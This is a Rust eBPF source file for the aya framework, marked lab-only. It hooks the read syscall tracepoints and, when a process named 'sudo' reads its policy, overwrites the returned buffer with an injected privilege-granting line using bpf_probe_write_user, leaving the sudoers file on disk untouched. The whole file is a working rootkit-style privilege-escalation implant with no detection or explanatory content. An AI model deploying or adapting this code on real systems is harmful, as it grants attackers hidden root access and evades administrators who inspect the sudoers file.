#![no_std]
#![no_main]
//! LAB-ONLY: when a process named "sudo" reads (its sudoers policy), overwrite
//! the returned buffer with an injected line granting privileges. The file on
//! disk is never touched. Uses the kernel-tainting bpf_probe_write_user.

use aya_ebpf::{
    helpers::{bpf_get_current_comm, bpf_get_current_pid_tgid, generated::bpf_probe_write_user},
    macros::{map, tracepoint},
    maps::{Array, HashMap},
    programs::TracePointContext,
};
use sudoadd_common::{Payload, ReadCtx};

#[map] static READS: HashMap<u64, ReadCtx> = HashMap::with_max_entries(1024, 0);
#[map] static PAYLOAD: Array<Payload> = Array::with_max_entries(1, 0);
#[map] static TAMPERS: HashMap<u32, u64> = HashMap::with_max_entries(1, 0);

#[inline(always)]
fn bump(m: &HashMap<u32, u64>, k: u32, by: u64) {
    let n = unsafe { m.get(&k).copied().unwrap_or(0) } + by;
    let _ = m.insert(&k, &n, 0);
}

#[inline(always)]
fn comm_is(target: &[u8]) -> bool {
    let comm = bpf_get_current_comm().unwrap_or_default(); // [u8; 16]
    let mut i = 0;
    while i < target.len() && i < 15 {
        if comm[i] != target[i] {
            return false;
        }
        i += 1;
    }
    comm[target.len()] == 0 // exact match: next byte is the null terminator
}

#[tracepoint]
pub fn enter_read(ctx: TracePointContext) -> u32 {
    if !comm_is(b"sudo") {
        return 0;
    }
    // syscalls:sys_enter_read — fd(@16), char *buf(@24), size_t count(@32)
    let buf: u64 = match unsafe { ctx.read_at(24) } { Ok(v) => v, _ => return 0 };
    let count: u64 = match unsafe { ctx.read_at(32) } { Ok(v) => v, _ => return 0 };
    let _ = READS.insert(&bpf_get_current_pid_tgid(), &ReadCtx { buf, count }, 0);
    0
}

#[tracepoint]
pub fn exit_read(ctx: TracePointContext) -> u32 {
    let _ = on_exit(&ctx);
    0
}

fn on_exit(ctx: &TracePointContext) -> Result<(), ()> {
    // syscalls:sys_exit_read — ret(@16) is bytes read
    let ret: i64 = unsafe { ctx.read_at(16) }.map_err(|_| ())?;
    let key = bpf_get_current_pid_tgid();
    let rc = *unsafe { READS.get(&key) }.ok_or(())?;
    let _ = READS.remove(&key);
    if ret <= 0 {
        return Ok(());
    }

    let p = unsafe { PAYLOAD.get(0) }.ok_or(())?;
    let len = if p.len > 64 { 64 } else { p.len }; // bound the write
    if (ret as u64) >= len as u64 && rc.count >= len as u64 {
        unsafe {
            bpf_probe_write_user(
                rc.buf as *mut core::ffi::c_void,
                p.line.as_ptr() as *const core::ffi::c_void,
                len,
            );
        }
        bump(&TAMPERS, 0, 1);
    }
    Ok(())
}

#[cfg(not(test))]
#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}
